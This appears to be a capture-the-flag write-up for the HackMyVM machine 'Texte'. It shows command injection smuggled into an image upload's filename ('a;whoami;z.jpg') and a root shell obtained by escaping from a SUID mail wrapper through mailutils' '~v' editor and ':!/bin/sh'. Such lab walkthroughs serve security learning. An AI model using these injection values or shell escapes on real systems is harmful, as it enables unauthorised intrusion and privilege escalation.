This is [Texte](https://hackmyvm.eu/machines/machine.php?vm=Secrets). It's Medium rated, and it was pretty great.

## Ports
SSH and HTTP only.

### HTTP
The frontpage has a simple UI to upload a file, and says:

>Dont upload .PHP FILES! STOP BITCHING. 

Lol. I run a dirsearch, but there's nothing else. I try a text file and get the message:

>File not allowed.

That surprised me a bit. Next I try a JPG, and it's fine. What happens though is the file doesn't seem to get saved anywhere, but it is inserted into the response as a base64 encoded PNG. So we have some sort of image processing on the server. I assume it might be ImageTragick, but trying some payloads demonstrates this is definitely not the case. Some googling leads me to [this page](https://www.onsecurity.io/blog/file-upload-checklist/#rce-via-the-file-name-parameter), and I find we do have command injection in the filename. 

``
filename="a;whoami;z.jpg"
``

Gives

``
<img src="data:image/png;base64,www-data
" alt="Happy" />
``

I try a few shell payloads but get nothing, it doesn't seem to like spaces. So I try a simple 'ls' and get:

>index.html  
uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt  
upload.php

Well, dirsearch/feroxbuster was never going to find that!

## Privesc
We've got an SUID binary in /opt:

{% highlight shell %}
kamila@texte:/opt$ ls -lash
total 24K
4.0K drwxr-xr-x  2 root root   4.0K Oct  8 05:46 .
4.0K drwxr-xr-x 18 root root   4.0K Oct  8 05:33 ..
 16K -rwsr-sr-x  1 root kamila  16K Oct  8 05:46 texte
{% endhighlight %}
 
 If we run strings, we find this line:
 
 ``
 /usr/bin/mail -s 'Remember,dont upload PHP files.' kamila@localhost
 ``
 
 So we've got a fully quoted binary path, so no dice there. What is /usr/bin/mail?
 
{% highlight shell %}
 kamila@texte:/opt$ file /usr/bin/mail
/usr/bin/mail: symbolic link to /etc/alternatives/mail
kamila@texte:/opt$ file /etc/alternatives/mail
/etc/alternatives/mail: symbolic link to /usr/bin/mail.mailutils
kamila@texte:/opt$ file /usr/bin/mail.mailutils
/usr/bin/mail.mailutils: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=54d4a357c9c43e5e3dadb03ef7727a580964eaa0, for GNU/Linux 3.2.0, stripped
{% endhighlight %}
 
 Right, so we have **mail.mailutils**. Running the program gives a simple interface to compose a mail message. The mail does get sent to kamila@localhost:
 
 {% highlight shell %}
 kamila@texte:/opt$ cat /var/mail/kamila

 If we go and [read the documentation](https://mailutils.org/manual/mailutils.html#Composing-Mail), we can see that running **~v** breaks us out into an editor, and then we can just do 
 
 ``
 :!/bin/sh
``
 
 to get a root shell, and we're done. I did try **~e** first but it didn't work:
 
{% highlight shell %}
 kamila@texte:/opt$ ./texte 
Cc: 
~e
/bin/bash: line 1: ed: command not found
(continue)
